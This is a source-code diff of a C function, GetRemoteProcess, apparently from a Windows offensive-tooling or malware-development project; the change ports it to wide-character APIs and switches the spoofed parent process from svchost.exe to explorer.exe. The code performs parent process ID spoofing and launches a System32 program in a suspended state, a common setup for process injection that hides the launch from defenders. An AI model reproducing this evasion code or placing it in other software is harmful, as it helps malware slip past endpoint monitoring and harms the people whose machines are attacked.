@@ -91,94 +91,101 @@ _END_OF_FUNC:
 	return (*pdwProcessID) ? TRUE : FALSE;
 }
 
-BOOL GetRemoteProcess( IN LPWSTR lpProcessName,OUT DWORD* dwProcessId,OUT HANDLE* hProcess,OUT HANDLE* hThread) {
+BOOL GetRemoteProcess(IN LPWSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
+    LPWSTR szProcessName = L"explorer.exe";
+    HANDLE hParentProcess = NULL;
+    DWORD dwParentProcessId = NULL;
 
-LPWSTR szProcessName = L"svchost.exe";
-HANDLE hParentProcess = NULL;
-DWORD dwParentProcessId = NULL;
+    GetRemoteParentProcess(szProcessName, &dwParentProcessId, &hParentProcess, NULL);
 
-GetRemoteParentProcess(szProcessName, &dwParentProcessId, &hParentProcess, NULL);
+    WCHAR lpPath[MAX_PATH * 2];
+    WCHAR WnDr[MAX_PATH];
 
+    SIZE_T sThreadAttList = NULL;
+    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;
 
-CHAR                               lpPath               [MAX_PATH * 2];
-CHAR                               WnDr                 [MAX_PATH];
+    STARTUPINFOEXW SiEx = { 0 };
+    PROCESS_INFORMATION Pi = { 0 };
 
-SIZE_T                             sThreadAttList       = NULL;
-PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList       = NULL;
+    RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXW));
+    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
 
-STARTUPINFOEXA                     SiEx                = { 0 };
-PROCESS_INFORMATION                Pi                  = { 0 };
+    // Setting the size of the structure
+    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXW);
 
-RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
-RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
+    // Ottieni la variabile di ambiente WINDIR in formato wide-character
+    if (!GetEnvironmentVariableW(L"WINDIR", WnDr, MAX_PATH)) {
+        wprintf(L"[!] GetEnvironmentVariableW Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
 
-// Setting the size of the structure
-SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+    // Verifica che lpProcessName sia valido e costruisci il percorso
+    if (lpProcessName == NULL || wcslen(lpProcessName) == 0) {
+        wprintf(L"[!] lpProcessName is invalid.\n");
+        return FALSE;
+    }
 
-if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
-    printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
+    // Costruisci il percorso del file in formato wide-character
+    _swprintf(lpPath, L"%s\\System32\\%s", WnDr, lpProcessName);
+
+    // Debug: stampa il percorso costruito
+    wprintf(L"[+] Full Path: %s\n", lpPath);
+
+    //-------------------------------------------------------------------------------
+
+    // This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
+    InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);	
+
+    // Allocating enough memory
+    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
+    if (pThreadAttList == NULL) {
+        wprintf(L"[!] HeapAlloc Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+
+    // Calling InitializeProcThreadAttributeList again, but passing the right parameters
+    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
+        wprintf(L"[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+
+    if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
+        wprintf(L"[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+
+    // Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
+    // created using UpdateProcThreadAttribute - that is the parent process
+    SiEx.lpAttributeList = pThreadAttList;
+
+    //-------------------------------------------------------------------------------
+
+    // Usa CreateProcessW per creare il processo
+    if (!CreateProcessW(
+        NULL,
+        lpPath,
+        NULL,
+        NULL,
+        FALSE,
+        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
+        NULL,
+        NULL,
+        &SiEx.StartupInfo,
+        &Pi)) {
+        wprintf(L"[!] CreateProcessW Failed with Error : %d \n", GetLastError());
+        return FALSE;
+    }
+
+    *dwProcessId = Pi.dwProcessId;
+    *hProcess = Pi.hProcess;
+    *hThread = Pi.hThread;
+
+    // Cleaning up
+    DeleteProcThreadAttributeList(pThreadAttList);
+    CloseHandle(hParentProcess);
+
+    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
+        return TRUE;
+
     return FALSE;
-}
-
-sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
-
-//-------------------------------------------------------------------------------
-
-// This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
-InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);	
-
-// Allocating enough memory
-pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
-if (pThreadAttList == NULL){
-    printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
-    return FALSE;
-}
-
-// Calling InitializeProcThreadAttributeList again, but passing the right parameters
-if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
-    printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
-    return FALSE;
-}
-
-if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
-    printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
-    return FALSE;
-}
-
-// Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
-// created using UpdateProcThreadAttribute - that is the parent process
-SiEx.lpAttributeList = pThreadAttList;
-
-//-------------------------------------------------------------------------------
-
-if (!CreateProcessA(
-    NULL,
-    lpPath,
-    NULL,
-    NULL,
-    FALSE,
-    EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
-    NULL,
-    NULL,
-    &SiEx.StartupInfo,
-    &Pi)) {
-    printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
-    return FALSE;
-}
-
-
-*dwProcessId	= Pi.dwProcessId;
-*hProcess		= Pi.hProcess;
-*hThread		= Pi.hThread;
-
-
-// Cleaning up
-DeleteProcThreadAttributeList(pThreadAttList);
-CloseHandle(hParentProcess);
-
-if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
-    return TRUE;
-
-return FALSE;
-
 }
